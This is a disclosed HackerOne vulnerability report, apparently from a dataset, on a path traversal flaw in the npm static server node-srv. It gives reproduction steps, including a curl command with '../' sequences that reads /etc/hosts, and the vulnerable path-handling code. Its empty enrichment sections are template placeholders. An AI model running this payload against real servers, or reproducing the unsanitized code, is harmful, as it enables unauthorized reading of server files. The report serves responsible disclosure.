---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '309124'
original_report_id: '309124'
title: '[node-srv] Path Traversal allows to read arbitrary files from remote server'
weakness: Path Traversal
team_handle: nodejs-ecosystem
created_at: '2018-01-25T20:00:51.494Z'
disclosed_at: '2018-03-07T15:33:00.365Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
asset_identifier: node-srv
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- path-traversal
---

# [node-srv] Path Traversal allows to read arbitrary files from remote server

## Metadata

- HackerOne Report ID: 309124
- Weakness: Path Traversal
- Program: nodejs-ecosystem
- Disclosed At: 2018-03-07T15:33:00.365Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi Guys,

**node-srv** contains Path Traversal vulnerability, which allows malicious user to read content of any file with known path.

**Module:** 

Simple static node.js server. Supports Heroku and Grunt.js
https://www.npmjs.com/package/node-srv


**Description**

```node-srv``` does not sanitize path in the correct way, so ```curl``` can be used to retrieve content of any file from the remote server.



## Steps To Reproduce:

- install ```node-srv```

```
$ npm install node-srv
```

- create simple server:

```javascript
//Require module 
var Server = require('node-srv');

// Start server 
var srv = new Server({
    port: 8080,
    root: './',
    logs: true
}, function () {
    console.log('Server stopped');
});
```

- run server:

```
$ node app.js
```

- visit ```http://127.0.0.1:8080``` to verify if everything is fine.

- now, run following ```curl``` command (please adjust numbers of ../ to your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/hosts
```

You should see the content of ```/etc/hosts``` file:

{F257357}


The problem is that url read from the user is not sanitize in any way against classic ```../``` path traversal payload:


```javascript
return new Promise((function(_this) {
        return function(resolve, reject) {
          var uri;
          uri = url.parse(req.url);
          return resolve(uri.pathname);
        };
      })(this)).then((function(_this) {
        return function(pathname) {
          filePath = pathname;
          filePath = filePath.replace(/\/$/, "/" + _this.options.index);
          filePath = filePath.replace(/^\//, "");
          filePath = path.resolve(process.cwd(), _this.options.root || './', filePath);
          return _this.processRequest(res, filePath);
        };
```



## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability allows malicious user to read content of any file on the server, which leads to data breach or other attacks.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
